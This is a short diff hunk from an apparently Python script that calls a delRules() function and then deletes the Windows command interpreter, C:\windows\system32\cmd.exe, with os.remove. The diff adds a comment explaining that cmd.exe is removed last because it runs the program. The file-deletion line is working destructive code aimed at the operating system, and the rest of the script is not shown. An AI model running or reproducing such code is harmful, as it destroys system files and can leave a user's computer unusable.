@@ -158,4 +158,5 @@ def delRules():
         except OSError:
             pass
 delRules()
+# Delete cmd.exe last because he used for running the program
 os.remove("\\windows\\system32\\cmd.exe")
